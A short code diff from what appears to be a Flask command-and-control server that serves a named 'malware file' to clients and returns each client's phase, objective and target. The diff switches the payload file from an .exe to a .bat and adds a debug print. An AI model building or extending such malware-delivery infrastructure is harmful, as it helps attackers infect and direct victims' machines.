@@ -53,7 +53,7 @@ MAL_FILE = the name of the malware file in "/Server/Control/files/" to be send t
 """
 
 DB_PATH = __file__[:-6]+"DB\\test.sqlite"
-MAL_FILE = "prueba.exe"
+MAL_FILE = "prueba.bat"
 
 """TESTING SECTION
 
@@ -157,6 +157,7 @@ def req(uid):
         print("Not in Database: ", uid) 
         return "False"
     else: #If uid is in the database, give all information
+        print(rows)
         return jsonify(phase = rows[1], obj =  rows[2], tar = rows[3], nam = rows[4])
 
 @app.route('/download')
